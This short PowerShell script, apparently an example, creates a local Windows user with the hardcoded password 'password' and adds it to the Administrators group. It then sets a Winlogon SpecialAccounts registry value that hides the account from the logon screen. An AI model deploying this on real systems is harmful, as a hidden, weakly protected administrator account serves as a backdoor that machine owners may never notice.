$userToCreate = "pawelsupelexamples"
if(Get-LocalUser -Name $userToCreate | Select *) {
"EXIST"
 #reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v $userToCreate /t REG_DWORD /d 1 /f 
} else { 
  net user $userToCreate password /add
  net localgroup Administratorzy $userToCreate /add 

  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v $userToCreate /t REG_DWORD /d 0 /f
}